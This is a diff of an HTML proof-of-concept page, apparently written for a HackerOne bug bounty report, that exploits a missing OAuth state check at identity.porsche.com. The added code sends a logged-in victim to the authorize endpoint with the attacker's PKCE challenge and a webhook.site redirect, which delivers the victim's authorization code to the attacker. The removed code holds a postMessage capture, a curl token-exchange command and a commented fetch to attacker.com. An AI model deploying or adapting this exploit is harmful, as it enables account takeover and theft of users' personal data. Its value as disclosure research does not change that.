@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Porsche OAuth CSRF - Live PoC</title>
+    <title>Porsche OAuth CSRF - Live Demo</title>
     <style>
         * {
             margin: 0;
@@ -25,7 +25,7 @@
             background: white;
             border-radius: 12px;
             box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            max-width: 800px;
+            max-width: 700px;
             width: 100%;
             padding: 40px;
         }
@@ -62,7 +62,7 @@
             font-size: 14px;
         }
         
-        #status {
+        .info-box {
             background: #e3f2fd;
             border-left: 4px solid #2196F3;
             padding: 20px;
@@ -70,15 +70,24 @@
             margin-bottom: 20px;
         }
         
-        #status h2 {
+        .info-box h2 {
             color: #1976D2;
-            margin-bottom: 10px;
+            margin-bottom: 15px;
             font-size: 20px;
         }
         
-        #status p {
+        .info-box p {
             color: #1565C0;
-            margin: 5px 0;
+            margin: 10px 0;
+            line-height: 1.6;
+        }
+        
+        .info-box code {
+            background: #fff;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-family: monospace;
+            color: #d32f2f;
         }
         
         .attack-button {
@@ -93,6 +102,7 @@
             box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
             transition: transform 0.2s, box-shadow 0.2s;
             margin: 20px 0;
+            width: 100%;
         }
         
         .attack-button:hover {
@@ -104,101 +114,20 @@
             transform: translateY(0);
         }
         
-        .spinner {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #2196F3;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        #result {
-            display: none;
-        }
-        
-        .success-box {
-            background: #d4edda;
-            border-left: 4px solid #28a745;
-            padding: 20px;
-            border-radius: 4px;
-            margin-bottom: 20px;
-        }
-        
-        .success-box h2 {
-            color: #155724;
-            margin-bottom: 15px;
-            font-size: 22px;
-        }
-        
-        .success-box h2::before {
-            content: "✅ ";
-        }
-        
-        .code-display {
-            background: #f8f9fa;
-            border: 2px solid #28a745;
-            border-radius: 6px;
-            padding: 15px;
-            margin: 15px 0;
-            word-break: break-all;
-            font-family: 'Courier New', monospace;
-            font-size: 13px;
-            color: #333;
-            line-height: 1.6;
-        }
-        
-        .impact-section {
-            background: #f8d7da;
-            border-left: 4px solid #dc3545;
-            padding: 20px;
-            border-radius: 4px;
-            margin: 20px 0;
-        }
-        
-        .impact-section h3 {
-            color: #721c24;
-            margin-bottom: 15px;
-            font-size: 18px;
-        }
-        
-        .impact-section ol {
-            color: #721c24;
-            margin-left: 20px;
-        }
-        
-        .impact-section li {
-            margin: 8px 0;
-        }
-        
-        .technical-details {
+        .credentials {
             background: #f8f9fa;
             border: 1px solid #dee2e6;
             border-radius: 6px;
-            padding: 20px;
-            margin: 20px 0;
-        }
-        
-        .technical-details h3 {
-            color: #495057;
-            margin-bottom: 15px;
-            font-size: 18px;
-        }
-        
-        .technical-details pre {
-            background: #ffffff;
-            border: 1px solid #ced4da;
-            border-radius: 4px;
             padding: 15px;
-            overflow-x: auto;
+            margin: 20px 0;
+            font-family: monospace;
             font-size: 12px;
-            line-height: 1.5;
+        }
+        
+        .credentials strong {
+            color: #495057;
+            display: block;
+            margin-bottom: 5px;
         }
         
         .footer {
@@ -209,14 +138,6 @@
             font-size: 14px;
             text-align: center;
         }
-        
-        .error-box {
-            background: #f8d7da;
-            border-left: 4px solid #dc3545;
-            padding: 20px;
-            border-radius: 4px;
-            color: #721c24;
-        }
     </style>
 </head>
 <body>
@@ -226,68 +147,26 @@
         
         <div class="warning-box">
             <strong>⚠️ Security Research Demonstration</strong>
-            <p>This page demonstrates a Cross-Site Request Forgery (CSRF) vulnerability in identity.porsche.com's OAuth implementation. Your authorization code will be captured and displayed below.</p>
+            <p>This page demonstrates a CSRF vulnerability in identity.porsche.com's OAuth implementation. When you click below, your authorization code will be captured and sent to the attacker's server.</p>
         </div>
 
-        <div id="status">
-            <h2>📋 Instructions</h2>
-            <p>1. Make sure you're logged into <strong>profile.porsche.com</strong> in another tab</p>
-            <p>2. Click the button below to trigger the CSRF attack</p>
-            <p>3. A popup will open briefly and capture your authorization code</p>
-            
-            <button id="attackBtn" class="attack-button">🚀 Start CSRF Attack</button>
-            
-            <div id="waiting" style="display:none; margin-top: 20px;">
-                <p style="color: #1976D2; font-weight: bold;">⏳ Waiting for authorization response...</p>
-                <div class="spinner"></div>
-            </div>
+        <div class="info-box">
+            <h2>📋 How This Works</h2>
+            <p><strong>1.</strong> You're logged into Porsche (victim)</p>
+            <p><strong>2.</strong> Click the button below (attacker's malicious link)</p>
+            <p><strong>3.</strong> Your browser sends YOUR cookies with ATTACKER's <code>code_challenge</code></p>
+            <p><strong>4.</strong> Server issues YOUR authorization code (CSRF vulnerability - no state validation!)</p>
+            <p><strong>5.</strong> Code redirects to attacker's webhook</p>
+            <p><strong>6.</strong> Attacker sees your code and can exchange it for access token</p>
         </div>
 
-        <div id="result">
-            <div class="success-box">
-                <h2>Authorization Code Successfully Captured!</h2>
-                <p><strong>Victim's Authorization Code:</strong></p>
-                <div class="code-display" id="code"></div>
-            </div>
-            
-            <div class="impact-section">
-                <h3>🎯 Attack Impact</h3>
-                <p>With this captured authorization code, an attacker can now:</p>
-                <ol>
-                    <li><strong>Exchange the code</strong> for a valid access token using their own code_verifier</li>
-                    <li><strong>Obtain full account access</strong> to the victim's Porsche account</li>
-                    <li><strong>Retrieve sensitive PII</strong> including:
-                        <ul>
-                            <li>Full name</li>
-                            <li>Email address</li>
-                            <li>Date of birth</li>
-                            <li>Complete home address</li>
-                            <li>Phone number</li>
-                        </ul>
-                    </li>
-                    <li><strong>Perform account actions</strong> as the victim</li>
-                </ol>
-            </div>
-            
-            <div class="technical-details">
-                <h3>🔧 Technical Details</h3>
-                <pre id="details"></pre>
-            </div>
-            
-            <div class="technical-details">
-                <h3>🐛 Vulnerability Explanation</h3>
-                <p style="color: #495057; line-height: 1.6; margin-bottom: 15px;">
-                    The vulnerability exists because <code>identity.porsche.com</code> accepts OAuth authorization requests 
-                    <strong>without validating the state parameter</strong>. This allows an attacker to craft a malicious 
-                    OAuth URL with their own <code>code_challenge</code>, trick a victim into clicking it, and receive 
-                    an authorization code for the victim's account that can be exchanged using the attacker's 
-                    <code>code_verifier</code>.
-                </p>
-                <p style="color: #495057; line-height: 1.6;">
-                    <strong>Root Cause:</strong> Missing OAuth state parameter validation (RFC 6749 Section 10.12)
-                </p>
-            </div>
+        <div class="credentials">
+            <strong>Attacker's PKCE Credentials:</strong>
+            Code Challenge: P8OxG_An1_EdQTZi3BBcrAZ7UWVoPO8IBB9lQd8kdZo<br>
+            Code Verifier: SvV8XrYxN2B93Fmy.RsC4PIJYHgI6nQ33Z2DpQYnnqQ
         </div>
+
+        <button id="attackBtn" class="attack-button">🚀 Trigger CSRF Attack</button>
 
         <div class="footer">
             <p>Security Research by JobiOne | HackerOne Bug Bounty Program</p>
@@ -297,133 +176,43 @@
 
     <script>
         // ===================================================================
-        // ATTACKER'S PKCE CREDENTIALS (Fresh from Account A)
+        // ATTACKER'S CREDENTIALS
         // ===================================================================
-        const ATTACKER_CODE_CHALLENGE = 'GmeSLfiYZdoWUq5uT-pDo2SG2oSdA2inWl0wCZagQT8';
-        const ATTACKER_CODE_VERIFIER = 'hgOAH9itlSHSa9sMrEGmEnKvMItB03eC9COrAQPGwRR';
-        const ATTACKER_NONCE = 'LivePoC_' + Date.now();
+        const ATTACKER_CODE_CHALLENGE = 'P8OxG_An1_EdQTZi3BBcrAZ7UWVoPO8IBB9lQd8kdZo';
+        const ATTACKER_CODE_VERIFIER = 'SvV8XrYxN2B93Fmy.RsC4PIJYHgI6nQ33Z2DpQYnnqQ';
+        
+        // REPLACE THIS WITH YOUR WEBHOOK.SITE URL
+        const ATTACKER_WEBHOOK = 'https://webhook.site/f123cfac-b720-4fb7-b9bf-96f8c681c974';
         
         console.log('=== PORSCHE OAUTH CSRF POC ===');
         console.log('Attacker Code Challenge:', ATTACKER_CODE_CHALLENGE);
-        console.log('Attacker Code Verifier:', ATTACKER_CODE_VERIFIER);
-        console.log('Attacker Nonce:', ATTACKER_NONCE);
+        console.log('Attacker Webhook:', ATTACKER_WEBHOOK);
         
         // ===================================================================
-        // BUILD MALICIOUS OAUTH URL (NO STATE PARAMETER - THIS IS THE BUG!)
-        // ===================================================================
-        const authUrl = 'https://identity.porsche.com/authorize?' +
-            'client_id=K2SaA3ojBmgbP95WtBYUfZwis9zM2bWB&' +
-            'scope=openid+email+profile&' +
-            'redirect_uri=https://profile.porsche.com/myprofile/auth/callback&' +
-            'audience=https://api.porsche.com&' +
-            'response_type=code&' +
-            'response_mode=web_message&' +
-            'nonce=' + ATTACKER_NONCE + '&' +
-            'code_challenge=' + ATTACKER_CODE_CHALLENGE + '&' +
-            'code_challenge_method=S256&' +
-            'auth0Client=eyJuYW1lIjoiQGF1dGgwL2F1dGgwLWFuZ3VsYXIiLCJ2ZXJzaW9uIjoiMi4yLjMifQ==';
-        
-        console.log('Malicious OAuth URL:', authUrl);
-        console.log('NOTE: No state parameter present - this is the CSRF vulnerability!');
-        
-        let popup;
-        
-        // ===================================================================
-        // BUTTON CLICK HANDLER
+        // BUILD MALICIOUS OAUTH URL
         // ===================================================================
         document.getElementById('attackBtn').addEventListener('click', function() {
-            console.log('Attack button clicked - opening popup');
+            console.log('Attack button clicked - redirecting to malicious OAuth URL');
             
-            // Hide button, show waiting message
-            document.getElementById('attackBtn').style.display = 'none';
-            document.getElementById('waiting').style.display = 'block';
+            // Build OAuth URL with attacker's challenge and webhook redirect
+            const authUrl = 'https://identity.porsche.com/authorize?' +
+                'client_id=K2SaA3ojBmgbP95WtBYUfZwis9zM2bWB&' +
+                'scope=openid+email+profile&' +
+                'redirect_uri=' + encodeURIComponent(ATTACKER_WEBHOOK) + '&' +
+                'audience=https://api.porsche.com&' +
+                'response_type=code&' +
+                'code_challenge=' + ATTACKER_CODE_CHALLENGE + '&' +
+                'code_challenge_method=S256&' +
+                'auth0Client=eyJuYW1lIjoiQGF1dGgwL2F1dGgwLWFuZ3VsYXIiLCJ2ZXJzaW9uIjoiMi4yLjMifQ==';
             
-            try {
-                popup = window.open(authUrl, 'oauth_popup', 'width=500,height=600,left=100,top=100');
-                console.log('Popup opened successfully');
-                
-                if (!popup) {
-                    throw new Error('Popup blocked');
-                }
-            } catch (e) {
-                console.error('Failed to open popup:', e);
-                document.getElementById('status').innerHTML = 
-                    '<div class="error-box"><strong>❌ Popup Blocked</strong>' +
-                    '<p>Please allow popups for this site in your browser settings and try again.</p></div>';
-            }
+            console.log('Malicious OAuth URL:', authUrl);
+            console.log('NOTE: No state parameter - this is the CSRF vulnerability!');
+            
+            // Redirect to OAuth endpoint - victim's cookies will be sent automatically
+            window.location.href = authUrl;
         });
-
-        // ===================================================================
-        // LISTEN FOR AUTHORIZATION RESPONSE VIA POSTMESSAGE
-        // ===================================================================
-        window.addEventListener('message', function(event) {
-            console.log('Received postMessage event:', event);
-            console.log('Event origin:', event.origin);
-            console.log('Event data:', event.data);
-            
-            // Check if message is from Porsche OAuth server or callback
-            if (event.origin === 'https://identity.porsche.com' || 
-                event.origin === 'https://profile.porsche.com') {
-                
-                console.log('Message from Porsche domain - processing...');
-                
-                // Check for authorization response
-                if (event.data && event.data.type === 'authorization_response') {
-                    const code = event.data.response.code;
-                    
-                    console.log('🎉 SUCCESS! Authorization code captured:', code);
-                    
-                    // Display the captured code
-                    document.getElementById('status').style.display = 'none';
-                    document.getElementById('result').style.display = 'block';
-                    document.getElementById('code').textContent = code;
-                    
-                    // Show technical details
-                    const details = {
-                        '🔑 Captured Authorization Code': code,
-                        '👤 Victim Account': event.data.response.sub || 'Unknown (will be revealed during token exchange)',
-                        '🔐 Attacker Code Challenge': ATTACKER_CODE_CHALLENGE,
-                        '🔓 Attacker Code Verifier': ATTACKER_CODE_VERIFIER,
-                        '🎲 Attacker Nonce': ATTACKER_NONCE,
-                        '⏰ Timestamp': new Date().toISOString(),
-                        '⚠️ Vulnerability': 'Missing OAuth state parameter validation',
-                        '📋 Next Steps': 'Attacker can now exchange this code with their verifier to obtain victim\'s access token'
-                    };
-                    
-                    document.getElementById('details').textContent = JSON.stringify(details, null, 2);
-                    
-                    // Log for manual token exchange
-                    console.log('\n=== TOKEN EXCHANGE COMMAND ===');
-                    console.log('Use this curl command to exchange the code:');
-                    console.log(`
-curl -X POST 'https://identity.porsche.com/oauth/token' \\
-  -H 'Content-Type: application/x-www-form-urlencoded' \\
-  -H 'Auth0-Client: eyJuYW1lIjoiQGF1dGgwL2F1dGgwLWFuZ3VsYXIiLCJ2ZXJzaW9uIjoiMi4yLjMifQ==' \\
-  -d 'grant_type=authorization_code' \\
-  -d 'code=${code}' \\
-  -d 'code_verifier=${ATTACKER_CODE_VERIFIER}' \\
-  -d 'client_id=K2SaA3ojBmgbP95WtBYUfZwis9zM2bWB' \\
-  -d 'redirect_uri=https://profile.porsche.com/myprofile/auth/callback'
-                    `);
-                    
-                    // In a real attack, this would be sent to attacker's server
-                    // fetch('https://attacker.com/capture', {
-                    //     method: 'POST',
-                    //     headers: { 'Content-Type': 'application/json' },
-                    //     body: JSON.stringify({ code: code, timestamp: new Date().toISOString() })
-                    // });
-                    
-                    // Close the popup
-                    if (popup && !popup.closed) {
-                        setTimeout(() => popup.close(), 1000);
-                    }
-                }
-            }
-        }, false);
         
-        // Log page load
         console.log('PoC page loaded and ready');
-        console.log('Click the button to start the attack');
     </script>
 </body>
 </html>
